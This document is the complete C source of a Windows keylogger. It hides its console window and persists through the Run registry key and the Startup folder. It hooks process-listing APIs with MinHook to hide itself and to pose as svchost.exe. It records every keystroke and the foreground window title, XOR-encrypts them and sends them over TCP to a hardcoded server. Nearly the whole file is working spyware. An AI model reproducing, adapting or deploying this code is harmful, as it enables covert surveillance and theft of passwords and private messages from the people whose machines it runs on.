#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include <winreg.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <psapi.h>
#include "minhook/include/MinHook.h"  // Include MinHook header

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "minhook/lib/libMinHook.x64.lib")  // Link MinHook library

#define SERVER_IP "192.168.1.64"
#define SERVER_PORT 8080
#define RECONNECT_DELAY 10000
#define SERVICE_NAME "WindowsService"
#define ENCRYPTION_KEY "S3cr3tK3y"
#define MAX_BUFFER 1024

// Function pointers for original APIs
typedef HANDLE(WINAPI* CREATETOOLHELP32SNAPSHOT)(DWORD, DWORD);
typedef BOOL(WINAPI* PROCESS32FIRST)(HANDLE, LPPROCESSENTRY32);
typedef BOOL(WINAPI* PROCESS32NEXT)(HANDLE, LPPROCESSENTRY32);
typedef BOOL(WINAPI* ENUMPROCESSES)(DWORD*, DWORD, DWORD*);
typedef BOOL(WINAPI* ENUMPROCESSMODULES)(HANDLE, HMODULE*, DWORD, LPDWORD);
typedef DWORD(WINAPI* GETMODULEBASENAME)(HANDLE, HMODULE, LPTSTR, DWORD);

// Original functions
CREATETOOLHELP32SNAPSHOT pCreateToolhelp32Snapshot = NULL;
PROCESS32FIRST pProcess32First = NULL;
PROCESS32NEXT pProcess32Next = NULL;
ENUMPROCESSES pEnumProcesses = NULL;
ENUMPROCESSMODULES pEnumProcessModules = NULL;
GETMODULEBASENAME pGetModuleBaseName = NULL;

// Our process name
char ourProcessName[MAX_PATH] = { 0 };

void HideConsoleWindow() {
    HWND hwnd = GetConsoleWindow();
    if (hwnd != NULL) {
        ShowWindow(hwnd, SW_HIDE);
    }
}

void xor_encrypt(char* data) {
    int key_len = strlen(ENCRYPTION_KEY);
    int data_len = strlen(data);
    for (int i = 0; i < data_len; i++) {
        data[i] = data[i] ^ ENCRYPTION_KEY[i % key_len];
    }
}

SOCKET connect_to_server() {
    WSADATA wsa;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in server;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return INVALID_SOCKET;
    }

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        WSACleanup();
        return INVALID_SOCKET;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    server.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        closesocket(sock);
        WSACleanup();
        return INVALID_SOCKET;
    }

    return sock;
}

void send_window_title(SOCKET sock) {
    char title[256];
    HWND foreground = GetForegroundWindow();

    if (foreground) {
        GetWindowText(foreground, title, sizeof(title));

        static char last_title[256] = "";
        if (strcmp(last_title, title) != 0) {
            char buffer[512];
            sprintf(buffer, "\n[Window: %s]\n", title);

            xor_encrypt(buffer);
            send(sock, buffer, strlen(buffer), 0);

            strcpy(last_title, title);
        }
    }
}

void install_persistence() {
    char path[MAX_PATH];
    HMODULE hModule = GetModuleHandle(NULL);
    GetModuleFileName(hModule, path, MAX_PATH);

    // Registry persistence
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, SERVICE_NAME, 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
    }

    // Also copy to startup folder
    char startupPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
        char destPath[MAX_PATH];
        sprintf(destPath, "%s\\%s", startupPath, SERVICE_NAME ".exe");
        CopyFile(path, destPath, FALSE);
    }
}

// Hooked functions
HANDLE WINAPI HookedCreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID) {
    HANDLE hSnapshot = pCreateToolhelp32Snapshot(dwFlags, th32ProcessID);
    return hSnapshot;
}

BOOL WINAPI HookedProcess32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) {
    BOOL result = pProcess32First(hSnapshot, lppe);
    if (result) {
        do {
            if (_stricmp(lppe->szExeFile, ourProcessName) == 0) {
                // Skip our process
                result = pProcess32Next(hSnapshot, lppe);
                continue;
            }
            break;
        } while (result);
    }
    return result;
}

BOOL WINAPI HookedProcess32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) {
    BOOL result;
    do {
        result = pProcess32Next(hSnapshot, lppe);
        if (result && _stricmp(lppe->szExeFile, ourProcessName) == 0) {
            // Skip our process
            continue;
        }
        break;
    } while (result);
    return result;
}

BOOL WINAPI HookedEnumProcesses(DWORD* pProcessIds, DWORD cb, DWORD* pBytesReturned) {
    BOOL result = pEnumProcesses(pProcessIds, cb, pBytesReturned);
    if (result) {
        DWORD numProcesses = *pBytesReturned / sizeof(DWORD);
        DWORD ourPid = GetCurrentProcessId();

        for (DWORD i = 0; i < numProcesses; i++) {
            if (pProcessIds[i] == ourPid) {
                // Remove our PID from the list
                for (DWORD j = i; j < numProcesses - 1; j++) {
                    pProcessIds[j] = pProcessIds[j + 1];
                }
                (*pBytesReturned) -= sizeof(DWORD);
                break;
            }
        }
    }
    return result;
}

BOOL WINAPI HookedEnumProcessModules(HANDLE hProcess, HMODULE* lphModule, DWORD cb, LPDWORD lpcbNeeded) {
    BOOL result = pEnumProcessModules(hProcess, lphModule, cb, lpcbNeeded);
    return result;
}

DWORD WINAPI HookedGetModuleBaseName(HANDLE hProcess, HMODULE hModule, LPTSTR lpBaseName, DWORD nSize) {
    DWORD result = pGetModuleBaseName(hProcess, hModule, lpBaseName, nSize);
    DWORD pid = GetProcessId(hProcess);
    if (pid == GetCurrentProcessId() && _stricmp(lpBaseName, ourProcessName) == 0) {
        // Return a fake name
        strncpy(lpBaseName, "svchost.exe", nSize);
        return strlen(lpBaseName);
    }
    return result;
}

// Initialize hooks
bool InitializeHooks() {
    // Get our process name
    GetModuleFileName(NULL, ourProcessName, MAX_PATH);
    char* lastBackslash = strrchr(ourProcessName, '\\');
    if (lastBackslash) {
        strcpy(ourProcessName, lastBackslash + 1);
    }

    // Initialize MinHook
    if (MH_Initialize() != MH_OK) {
        return false;
    }

    // Create hooks
    if (MH_CreateHookApi(L"kernel32", "CreateToolhelp32Snapshot", HookedCreateToolhelp32Snapshot, (LPVOID*)&pCreateToolhelp32Snapshot) != MH_OK) {
        return false;
    }

    if (MH_CreateHookApi(L"kernel32", "Process32First", HookedProcess32First, (LPVOID*)&pProcess32First) != MH_OK) {
        return false;
    }

    if (MH_CreateHookApi(L"kernel32", "Process32Next", HookedProcess32Next, (LPVOID*)&pProcess32Next) != MH_OK) {
        return false;
    }

    if (MH_CreateHookApi(L"psapi", "EnumProcesses", HookedEnumProcesses, (LPVOID*)&pEnumProcesses) != MH_OK) {
        return false;
    }

    if (MH_CreateHookApi(L"psapi", "EnumProcessModules", HookedEnumProcessModules, (LPVOID*)&pEnumProcessModules) != MH_OK) {
        return false;
    }

    if (MH_CreateHookApi(L"psapi", "GetModuleBaseNameA", HookedGetModuleBaseName, (LPVOID*)&pGetModuleBaseName) != MH_OK) {
        return false;
    }

    // Enable all hooks
    if (MH_EnableHook(MH_ALL_HOOKS) != MH_OK) {
        return false;
    }

    return true;
}

// Main function
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Hide console window if it exists
    HideConsoleWindow();

    // Set process priority
    SetPriorityClass(GetCurrentProcess(), IDLE_PRIORITY_CLASS);

    // Initialize hooks to hide from Task Manager
    if (!InitializeHooks()) {
        // If hooks fail, continue anyway but might be visible
    }

    // Install persistence
    install_persistence();

    SOCKET sock;
    static bool key_states[256] = { 0 };

    while (1) {
        sock = connect_to_server();

        if (sock != INVALID_SOCKET) {
            while (1) {
                send_window_title(sock);

                for (int key = 8; key <= 190; key++) {
                    if ((GetAsyncKeyState(key) & 0x8000) && !key_states[key]) {
                        char key_str[20] = { 0 };

                        if (key >= 65 && key <= 90) {
                            sprintf(key_str, "%c", key + 32);
                        }
                        else if (key >= 48 && key <= 57) {
                            sprintf(key_str, "%c", key);
                        }
                        else {
                            switch (key) {
                            case VK_SPACE: strcpy(key_str, " "); break;
                            case VK_RETURN: strcpy(key_str, "[ENTER]\n"); break;
                            case VK_TAB: strcpy(key_str, "[TAB]"); break;
                            case VK_SHIFT: strcpy(key_str, "[SHIFT]"); break;
                            case VK_BACK: strcpy(key_str, "\b"); break;
                            case VK_ESCAPE: strcpy(key_str, "[ESC]"); break;
                            case VK_CONTROL: strcpy(key_str, "[CTRL]"); break;
                            case VK_LWIN: case VK_RWIN: strcpy(key_str, "[WIN]"); break;
                            case VK_MENU: strcpy(key_str, "[ALT]"); break;
                            case VK_CAPITAL: strcpy(key_str, "[CAPSLOCK]"); break;
                            case VK_DELETE: strcpy(key_str, "[DELETE]"); break;
                            case VK_INSERT: strcpy(key_str, "[INSERT]"); break;
                            case VK_HOME: strcpy(key_str, "[HOME]"); break;
                            case VK_END: strcpy(key_str, "[END]"); break;
                            case VK_LEFT: strcpy(key_str, "[LEFT]"); break;
                            case VK_RIGHT: strcpy(key_str, "[RIGHT]"); break;
                            case VK_UP: strcpy(key_str, "[UP]"); break;
                            case VK_DOWN: strcpy(key_str, "[DOWN]"); break;
                            case VK_OEM_1: strcpy(key_str, ";"); break;
                            case VK_OEM_7: strcpy(key_str, "'"); break;
                            case VK_OEM_COMMA: strcpy(key_str, ","); break;
                            case VK_OEM_PERIOD: strcpy(key_str, "."); break;
                            case VK_OEM_MINUS: strcpy(key_str, "-"); break;
                            case VK_OEM_PLUS: strcpy(key_str, "+"); break;
                            case VK_OEM_2: strcpy(key_str, "/"); break;
                            case VK_OEM_3: strcpy(key_str, "`"); break;
                            case VK_OEM_4: strcpy(key_str, "["); break;
                            case VK_OEM_5: strcpy(key_str, "\\"); break;
                            case VK_OEM_6: strcpy(key_str, "]"); break;
                            default: continue;
                            }
                        }

                        xor_encrypt(key_str);
                        if (send(sock, key_str, strlen(key_str), 0) == SOCKET_ERROR) {
                            closesocket(sock);
                            WSACleanup();
                            sock = INVALID_SOCKET;
                            break;
                        }

                        key_states[key] = true;
                    }
                    if (!(GetAsyncKeyState(key) & 0x8000)) {
                        key_states[key] = false;
                    }
                }

                if (sock == INVALID_SOCKET) {
                    break;
                }

                Sleep(10);
            }
        }

        Sleep(RECONNECT_DELAY);
    }

    // Cleanup hooks before exiting
    MH_DisableHook(MH_ALL_HOOKS);
    MH_Uninitialize();

    return 0;
}